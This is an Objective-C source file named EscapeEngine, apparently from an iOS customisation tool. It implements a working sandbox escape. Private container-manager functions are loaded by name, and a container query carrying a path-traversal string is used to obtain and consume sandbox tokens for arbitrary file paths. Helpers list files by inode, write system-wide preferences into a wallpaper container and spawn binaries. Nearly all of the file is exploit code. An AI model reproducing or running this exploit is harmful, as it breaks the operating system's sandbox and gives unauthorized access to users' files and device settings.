#import "EscapeEngine.h"
#import "LogManager.h"
#import <dlfcn.h>
#import <sys/stat.h>
#import <dirent.h>
#import <unistd.h>
#import <fcntl.h>
#import <spawn.h>
#import <sys/wait.h>
#import <stdlib.h>
#import <stdio.h>
#import <string.h>
#import <errno.h>
#import <xpc/xpc.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <CoreFoundation/CoreFoundation.h>

// ── sandbox_extension_* ────────────────────────────────────────────────

typedef int64_t (*issue_fn_t)(const char *, uint32_t, pid_t);
typedef int (*consume_fn_t)(int64_t);

static issue_fn_t g_issue = NULL;
static consume_fn_t g_consume = NULL;

static void load_symbols(void) {
    static dispatch_once_t o;
    dispatch_once(&o, ^{
        void *h = dlopen(NULL, RTLD_NOW);
        if (!h) return;
        g_issue   = (issue_fn_t)dlsym(h, "sandbox_extension_issue_file");
        g_consume = (consume_fn_t)dlsym(h, "sandbox_extension_consume");
        if (!g_issue)   g_issue   = (issue_fn_t)dlsym(h, "_sandbox_extension_issue_file");
        if (!g_consume) g_consume = (consume_fn_t)dlsym(h, "_sandbox_extension_consume");
    });
}

// ── bad_query ──────────────────────────────────────────────────────────

typedef void   *(*container_query_create_fn)(void);
typedef void    (*container_query_set_class_fn)(void *, uint64_t);
typedef void    (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void    (*container_query_set_flags_fn)(void *, uint64_t);
typedef void    (*container_query_set_part_fn)(void *, uint64_t);
typedef void    (*container_query_set_part_domain_fn)(void *, const char *);
typedef void   *(*container_query_get_single_result_fn)(void *);
typedef void    (*container_query_free_fn)(void *);
typedef char   *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn2)(const char *);
typedef int     (*sandbox_extension_release_fn)(int64_t);

static int64_t run_bad_query(char *path, bool create, char *group_identifier, bool is_group) {
    if (!path || path[0] != '/') return -255;
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    container_query_create_fn           query_create          = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn        query_set_class       = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn  query_set_group_ids   = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn        query_set_flags       = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn         query_set_part        = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn  query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_result     = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn             query_free            = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn     copy_sandbox_token    = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn2       consume_extension     = (sandbox_extension_consume_fn2)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!query_create || !query_set_class || !query_set_group_ids || !query_set_flags ||
        !query_set_part || !query_set_part_domain || !query_get_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -1;
    }

    void *query = query_create();
    if (!query) { dlclose(mgr); return -2; }

    xpc_object_t identifier;
    if (group_identifier == NULL) {
        query_set_class(query, 13);
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        query_set_class(query, 7);
        identifier = xpc_string_create(group_identifier);
    }
    query_set_group_ids(query, identifier);
    query_set_part(query, 3);

    char *part = NULL;
    if (group_identifier == NULL) {
        if (asprintf(&part, "../../../../../../../..%s", path) == -1) {
            xpc_release(identifier); query_free(query); dlclose(mgr); return -5;
        }
    } else {
        if (asprintf(&part, "../../../../../../../../..%s", path) == -1) {
            xpc_release(identifier); query_free(query); dlclose(mgr); return -5;
        }
    }
    query_set_part_domain(query, part);

    if (is_group) {
        query_set_flags(query, 0x0000000800000000ULL);
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    void *result = query_get_result(query);
    if (!result) {
        free(part); xpc_release(identifier); query_free(query); dlclose(mgr); return -3;
    }

    char *token = copy_sandbox_token(result);
    if (!token) {
        free(part); xpc_release(identifier); query_free(query); dlclose(mgr); return -4;
    }

    int64_t handle = consume_extension(token);
    free(token);
    free(part);
    xpc_release(identifier);
    query_free(query);
    dlclose(mgr);
    return handle;
}

// ── EscapeEngine implementation ────────────────────────────────────────

@implementation EscapeEngine

+ (NSDictionary *)probeSurface {
    @try {
        load_symbols();
        NSMutableDictionary *r = [NSMutableDictionary dictionary];
        r[@"extension_issue"]   = @(g_issue   != NULL);
        r[@"extension_consume"] = @(g_consume != NULL);
        for (NSString *p in @[@"/var/containers/Shared/SystemGroup",
                              @"/var/mobile/Library/Preferences"]) {
            struct stat st;
            r[[NSString stringWithFormat:@"stat_%@", p]] = @(stat(p.UTF8String, &st) == 0);
        }
        r[@"token_issued"]   = @NO;
        r[@"token_consumed"] = @NO;
        return r;
    } @catch (NSException *e) {
        return @{@"error": e.reason ?: @"unknown"};
    }
}

+ (EscapeResult)escapeToPath:(NSString *)path write:(BOOL)write {
    @try {
        char *cpath = strdup(path.UTF8String);
        int64_t h = run_bad_query(cpath, write, NULL, false);
        free(cpath);
        if (h >= 0) return EscapeResultSuccess;
        switch (h) {
            case -1: case -2: return EscapeResultSymbolMissing;
            case -3: return EscapeResultTokenBlocked;
            case -4: case -254: return EscapeResultPathDenied;
            default: return EscapeResultPathDenied;
        }
    } @catch (NSException *e) {
        return EscapeResultPathDenied;
    }
}

+ (int64_t)badQueryPath:(NSString *)path group:(NSString *)group isGroup:(BOOL)isGroup {
    char *cpath = strdup(path.UTF8String);
    char *cgroup = group ? strdup(group.UTF8String) : NULL;
    int64_t h = run_bad_query(cpath, true, cgroup, isGroup);
    free(cpath);
    if (cgroup) free(cgroup);
    return h;
}

+ (void)badQueryRelease:(int64_t)handle {
    if (handle < 0) return;
    sandbox_extension_release_fn rel = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (rel) rel(handle);
}

+ (NSString *)badQueryList:(NSString *)path maxInode:(int64_t)maxInode {
    char *cpath = strdup(path.UTF8String);
    struct statfs sfs;
    if (statfs(cpath, &sfs) != 0) { free(cpath); return nil; }
    fsid_t fsid = sfs.f_fsid;

    size_t cap = 65536, length = 0;
    size_t path_length = strlen(cpath);
    char *out = malloc(cap);
    if (!out) { free(cpath); return nil; }
    out[0] = '\0';

    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)maxInode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, cpath, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    free(cpath);
    NSString *res = [NSString stringWithUTF8String:out];
    free(out);
    return res;
}

+ (NSArray<NSString *> *)enumerateSystemGroupContainers {
    NSMutableArray *res = [NSMutableArray array];
    DIR *d = opendir("/var/containers/Shared/SystemGroup");
    if (!d) return res;
    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;
        [res addObject:[NSString stringWithFormat:@"%s/%s",
                        "/var/containers/Shared/SystemGroup", e->d_name]];
    }
    closedir(d);
    return res;
}

+ (NSString *)posterBoardContainer {
    for (NSString *c in [self enumerateSystemGroupContainers]) {
        NSDictionary *t = [NSDictionary dictionaryWithContentsOfFile:
            [c stringByAppendingPathComponent:@"Library/SandboxTags.plist"]];
        NSString *o = t[@"SandboxContainerOwner"];
        if ([o hasPrefix:@"systemgroup.com.apple.wallpaper"] ||
            [o hasPrefix:@"systemgroup.com.apple.posterboard"]) {
            return c;
        }
    }
    return nil;
}

+ (NSString *)collectionsDir {
    NSString *c = [self posterBoardContainer];
    return c ? [c stringByAppendingPathComponent:
        @"Library/Application Support/PosterBoard/Collections"] : nil;
}

+ (BOOL)writeData:(NSData *)data toPath:(NSString *)path {
    NSError *e = nil;
    if (![data writeToFile:path options:0 error:&e]) {
        [[LogManager shared] logString:[NSString stringWithFormat:@"write err: %@", e.localizedDescription]];
        return NO;
    }
    return YES;
}

+ (BOOL)writePref:(NSString *)key value:(id)value appID:(NSString *)appID {
    @try {
        CFPreferencesSetAppValue((__bridge CFStringRef)key,
                                 (__bridge CFPropertyListRef)value,
                                 (__bridge CFStringRef)appID);
        CFPreferencesAppSynchronize((__bridge CFStringRef)appID);
        return YES;
    } @catch (NSException *e) { return NO; }
}

+ (BOOL)writeAnyUserPref:(NSString *)key value:(id)value appID:(NSString *)appID {
    @try {
        CFPreferencesSetValue((__bridge CFStringRef)key,
                              (__bridge CFPropertyListRef)value,
                              (__bridge CFStringRef)appID,
                              kCFPreferencesAnyUser,
                              kCFPreferencesAnyHost);
        CFPreferencesSynchronize((__bridge CFStringRef)appID,
                                 kCFPreferencesAnyUser,
                                 kCFPreferencesAnyHost);
        return YES;
    } @catch (NSException *e) { return NO; }
}

+ (NSDictionary *)readPrefApp:(NSString *)appID {
    @try {
        CFArrayRef keys = CFPreferencesCopyKeyList((__bridge CFStringRef)appID,
                                                   kCFPreferencesCurrentUser,
                                                   kCFPreferencesCurrentHost);
        NSMutableDictionary *d = [NSMutableDictionary dictionary];
        for (CFIndex i = 0; i < CFArrayGetCount(keys); i++) {
            CFStringRef k = CFArrayGetValueAtIndex(keys, i);
            CFPropertyListRef v = CFPreferencesCopyAppValue(k, (__bridge CFStringRef)appID);
            d[(__bridge NSString *)k] = (__bridge id)v;
        }
        CFRelease(keys);
        return d;
    } @catch (NSException *e) { return nil; }
}

+ (NSDictionary *)readAnyUserPrefApp:(NSString *)appID {
    @try {
        CFArrayRef keys = CFPreferencesCopyKeyList((__bridge CFStringRef)appID,
                                                   kCFPreferencesAnyUser,
                                                   kCFPreferencesAnyHost);
        NSMutableDictionary *d = [NSMutableDictionary dictionary];
        for (CFIndex i = 0; i < CFArrayGetCount(keys); i++) {
            CFStringRef k = CFArrayGetValueAtIndex(keys, i);
            CFPropertyListRef v = CFPreferencesCopyValue(k,
                                                         (__bridge CFStringRef)appID,
                                                         kCFPreferencesAnyUser,
                                                         kCFPreferencesAnyHost);
            d[(__bridge NSString *)k] = (__bridge id)v;
        }
        if (keys) CFRelease(keys);
        return d;
    } @catch (NSException *e) { return nil; }
}

+ (BOOL)deletePref:(NSString *)key appID:(NSString *)appID {
    @try {
        CFPreferencesSetValue((__bridge CFStringRef)key, NULL,
                              (__bridge CFStringRef)appID,
                              kCFPreferencesAnyUser,
                              kCFPreferencesAnyHost);
        CFPreferencesSynchronize((__bridge CFStringRef)appID,
                                 kCFPreferencesAnyUser,
                                 kCFPreferencesAnyHost);
        return YES;
    } @catch (NSException *e) { return NO; }
}

+ (int)spawnBin:(NSString *)path args:(NSArray *)args {
    int argc = (int)args.count + 2;
    char **argv = (char **)malloc(sizeof(char *) * argc);
    argv[0] = (char *)path.UTF8String;
    for (int i = 0; i < args.count; i++) argv[i + 1] = (char *)[args[i] UTF8String];
    argv[argc - 1] = NULL;
    extern char **environ;
    pid_t pid = 0;
    int ret = posix_spawn(&pid, path.UTF8String, NULL, NULL, argv, environ);
    free(argv);
    if (ret != 0) return ret;
    int status = 0;
    waitpid(pid, &status, 0);
    return WEXITSTATUS(status);
}

@end